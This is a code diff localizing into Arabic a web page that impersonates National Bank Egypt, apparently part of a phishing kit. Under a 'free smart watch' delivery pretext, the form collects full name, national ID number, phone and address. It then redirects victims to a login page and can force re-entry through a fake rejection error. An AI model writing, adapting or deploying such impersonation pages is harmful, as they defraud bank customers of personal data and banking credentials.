@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>National Bank Egypt - Personal Information</title>
+    <title>البنك الأهلي - المعلومات الشخصية</title>
     <style>
         * {
             margin: 0;
@@ -22,6 +22,7 @@
             flex-direction: column;
             min-height: 100vh;
         }
+        /* Header: Logo on the right, Login button, Language button, and three bars on the left */
         header {
             background-color: #ffffff;
             display: flex;
@@ -83,6 +84,7 @@
             background-color: #07543f;
         }
 
+        /* Form Container Section */
         .form-container-wrapper {
             max-width: 600px;
             margin: 40px auto;
@@ -153,6 +155,7 @@
             background-color: #07543f;
         }
 
+        /* Footer */
         footer {
             background-color: #0b6b4f;
             color: white;
@@ -196,88 +199,88 @@
             font-size: 13px;
         }
     </style>
-    <link rel="stylesheet" href="shared-theme.css">
+    <link rel="stylesheet" href="{{ url_for('static', filename='shared-theme.css') }}">
 </head>
 <body>
 
 
 
-    <!-- Header: Logo left, Login button, Language button, and Menu icon right -->
+    <!-- Header: Logo right, Login button, Language button, and Menu icon left -->
 <header class="site-header">
-    <a class="site-brand" href="index_en.html" aria-label="National Bank Egypt">
-        <img src="static_nbe_logo_full.png" alt="National Bank Egypt">
+    <a class="site-brand" href="index.html" aria-label="البنك الأهلي">
+        <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="البنك الأهلي">
     </a>
     <div class="site-header-actions header-left">
-        <a href="index.html" class="language-icon" aria-label="العربية" title="العربية">
+        <a href="index_en.html" class="language-icon" aria-label="English" title="English">
             <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
         </a>
-        <span class="language-label">العربية</span>
-        <div class="header-icon" title="Menu" aria-label="Menu">&#9776;</div>
+        <span class="language-label">English</span>
+        <div class="header-icon" title="القائمة" aria-label="القائمة">&#9776;</div>
     </div>
 </header>
 
     <!-- Personal Information Form Section -->
     <div class="form-container-wrapper">
         <div class="form-box">
-            <h2 class="form-title">Personal Information</h2>
+            <h2 class="form-title">البيانات الشخصية</h2>
             <form id="personalInfoForm">
                 <div class="form-group">
-                    <label for="fullName">Full Name</label>
-                    <input type="text" id="fullName" name="fullName" class="form-control" placeholder="Enter your full name" required>
+                    <label for="fullName">الاسم الكامل</label>
+                    <input type="text" id="fullName" name="fullName" class="form-control" placeholder="أدخل اسمك الكامل" required>
                 </div>
 
                 <div class="form-group">
-                    <label for="nationalId">National ID (14 digits)</label>
-                    <input type="text" id="nationalId" name="nationalId" class="form-control" placeholder="Enter your national ID" inputmode="numeric" pattern="[0-9]*" maxlength="14" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
+                    <label for="nationalId">الرقم القومي (14 رقم)</label>
+                    <input type="text" id="nationalId" name="nationalId" class="form-control" placeholder="أدخل الرقم القومي" inputmode="numeric" pattern="[0-9]*" maxlength="14" autocomplete="off" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
                 </div>
 
                 <div class="form-group">
-                    <label for="phone">Phone Number</label>
-                    <div class="phone-input-wrapper" dir="ltr"><span class="country-code" aria-label="Egypt"><span class="egypt-flag" aria-hidden="true">🇪🇬</span><bdi>+20</bdi></span><input type="tel" id="phone" name="phone" class="form-control phone-control" placeholder="Phone number" inputmode="numeric" pattern="[0-9]*" maxlength="11" autocomplete="tel-national" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required></div>
+                    <label for="phone">رقم الهاتف</label>
+                    <div class="phone-input-wrapper" dir="ltr"><span class="country-code" aria-label="مصر"><span class="egypt-flag" aria-hidden="true">🇪🇬</span><bdi>+20</bdi></span><input type="tel" id="phone" name="phone" class="form-control phone-control" placeholder="رقم الهاتف" inputmode="numeric" pattern="[0-9]*" maxlength="11" autocomplete="tel-national" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required></div>
                 </div>
 
                 <div class="form-group">
-                    <label for="governorate">Governorate</label>
+                    <label for="governorate">المحافظة</label>
                     <select id="governorate" name="governorate" class="form-control" required>
-                        <option value="" disabled selected>Select governorate</option>
-                        <option value="Cairo">Cairo</option>
-                        <option value="Alexandria">Alexandria</option>
-                        <option value="Aswan">Aswan</option>
-                        <option value="Assiut">Assiut</option>
-                        <option value="Luxor">Luxor</option>
-                        <option value="Ismailia">Ismailia</option>
-                        <option value="Red Sea">Red Sea</option>
-                        <option value="Beheira">Beheira</option>
-                        <option value="Beni Suef">Beni Suef</option>
-                        <option value="Port Said">Port Said</option>
-                        <option value="South Sinai">South Sinai</option>
-                        <option value="Giza">Giza</option>
-                        <option value="Dakahlia">Dakahlia</option>
-                        <option value="Damietta">Damietta</option>
-                        <option value="Sohag">Sohag</option>
-                        <option value="Suez">Suez</option>
-                        <option value="Sharqia">Sharqia</option>
-                        <option value="Gharbia">Gharbia</option>
-                        <option value="Faiyum">Faiyum</option>
-                        <option value="Qena">Qena</option>
-                        <option value="Kafr El Sheikh">Kafr El Sheikh</option>
-                        <option value="Matrouh">Matrouh</option>
-                        <option value="Minya">Minya</option>
-                        <option value="Monufia">Monufia</option>
-                        <option value="North Sinai">North Sinai</option>
-                        <option value="New Valley">New Valley</option>
-                        <option value="Qalyubia">Qalyubia</option>
+                        <option value="" disabled selected>اختر المحافظة</option>
+                        <option value="القاهرة">القاهرة</option>
+                        <option value="الإسكندرية">الإسكندرية</option>
+                        <option value="أسوان">أسوان</option>
+                        <option value="أسيوط">أسيوط</option>
+                        <option value="الأقصر">الأقصر</option>
+                        <option value="الإسماعيلية">الإسماعيلية</option>
+                        <option value="البحر الأحمر">البحر الأحمر</option>
+                        <option value="البحيرة">البحيرة</option>
+                        <option value="بني سويف">بني سويف</option>
+                        <option value="بورسعيد">بورسعيد</option>
+                        <option value="جنوب سيناء">جنوب سيناء</option>
+                        <option value="الجيزة">الجيزة</option>
+                        <option value="الدقهلية">الدقهلية</option>
+                        <option value="دمياط">دمياط</option>
+                        <option value="سوهاج">سوهاج</option>
+                        <option value="السويس">السويس</option>
+                        <option value="الشرقية">الشرقية</option>
+                        <option value="الغربية">الغربية</option>
+                        <option value="الفيوم">الفيوم</option>
+                        <option value="قنا">قنا</option>
+                        <option value="كفر الشيخ">كفر الشيخ</option>
+                        <option value="مطروح">مطروح</option>
+                        <option value="المنيا">المنيا</option>
+                        <option value="المنوفية">المنوفية</option>
+                        <option value="شمال سيناء">شمال سيناء</option>
+                        <option value="الوادي الجديد">الوادي الجديد</option>
+                        <option value="القليوبية">القليوبية</option>
                     </select>
                 </div>
 
                 <div class="form-group">
-                    <label for="deliveryAddress">Delivery Address</label>
-                    <textarea id="deliveryAddress" name="deliveryAddress" class="form-control" rows="4" placeholder="Enter your delivery address in detail" required></textarea>
-                    <p style="margin-top:10px; font-size:13px; color:#0b6b4f; font-weight:bold;">The smart watch will be shipped to this address</p>
+                    <label for="deliveryAddress">عنوان التوصيل</label>
+                    <textarea id="deliveryAddress" name="deliveryAddress" class="form-control" rows="4" placeholder="اكتب عنوان التوصيل بالتفصيل" required></textarea>
+                    <p style="margin-top:10px; font-size:13px; color:#0b6b4f; font-weight:bold;">سيتم شحن الساعة الذكية إلى هذا العنوان</p>
                 </div>
 
                 <div id="errorMessage" style="color: red; text-align: center; margin-bottom: 15px; display: none;"></div>
-                <button type="submit" class="submit-btn">Continue Request</button>
+                <button type="submit" class="submit-btn">متابعة الطلب</button>
             </form>
         </div>
     </div>
@@ -286,22 +289,22 @@
 <footer class="site-footer">
     <div class="footer-content">
         <div class="footer-section">
-            <h3>Legal Pages</h3>
+            <h3>الصفحات القانونية</h3>
             <ul>
-                <li><a href="#">Privacy Policy</a></li>
-                <li><a href="#">Terms &amp; Conditions</a></li>
-                <li><a href="#">Disclaimer</a></li>
-                <li><a href="#">Customer Security</a></li>
+                <li><a href="#">سياسة الخصوصية</a></li>
+                <li><a href="#">الشروط والأحكام</a></li>
+                <li><a href="#">إخلاء المسؤولية</a></li>
+                <li><a href="#">الأمان وحماية العميل</a></li>
             </ul>
         </div>
         <div class="footer-section">
-            <h3>Customer Care &amp; Contact</h3>
-            <p><strong>Customer Care:</strong> 19900</p>
-            <p><strong>Landline:</strong> 0223456789</p>
-            <p><strong>Official Email:</strong> info@nbk.com</p>
+            <h3>خدمة العملاء والاتصال</h3>
+            <p><strong>خدمة العملاء:</strong> 19900</p>
+            <p><strong>الخط الأرضي:</strong> 0223456789</p>
+            <p><strong>البريد الإلكتروني الرسمي:</strong> info@nbk.com</p>
         </div>
     </div>
-    <div class="footer-bottom"><p>All rights reserved © National Bank Egypt 2026</p></div>
+    <div class="footer-bottom"><p>جميع الحقوق محفوظة © البنك الأهلي 2026</p></div>
 </footer>
 
     <!-- Rejected Message Handler -->
@@ -309,7 +312,7 @@
         const urlParams = new URLSearchParams(window.location.search);
         if (urlParams.get("rejected") === "true") {
             const errorMessageDiv = document.getElementById("errorMessage");
-            errorMessageDiv.textContent = "Sorry, an error occurred while processing your request. Please re-enter your details.";
+            errorMessageDiv.textContent = "عذراً، حدث خطأ أثناء معالجة طلبك. يرجى إعادة إدخال البيانات.";
             errorMessageDiv.style.display = "block";
         }
     </script>
@@ -321,7 +324,7 @@
             headers: {
                 "Content-Type": "application/json",
             },
-            body: JSON.stringify({ action: "track_visit", page: "personal_info_en" })
+            body: JSON.stringify({ action: "track_visit", page: "personal_info" })
         }).catch(error => console.error("Error tracking visit:", error));
 
         document.getElementById("personalInfoForm").addEventListener("submit", async function(event) {
@@ -356,14 +359,14 @@
 
                 if (result.status === "approved" || result.status === "pending") {
                     localStorage.setItem("request_id", result.request_id);
-                    window.location.href = "login_en.html";
+                    window.location.href = "login.html";
                 } else {
-                    errorMessageDiv.textContent = result.message || "An unexpected error occurred.";
+                    errorMessageDiv.textContent = result.message || "حدث خطأ غير متوقع.";
                     errorMessageDiv.style.display = "block";
                 }
             } catch (error) {
                 console.error("Error during personal info submission:", error);
-                errorMessageDiv.textContent = "Error connecting to the server.";
+                errorMessageDiv.textContent = "حدث خطأ أثناء الاتصال بالخادم.";
                 errorMessageDiv.style.display = "block";
             }
         });
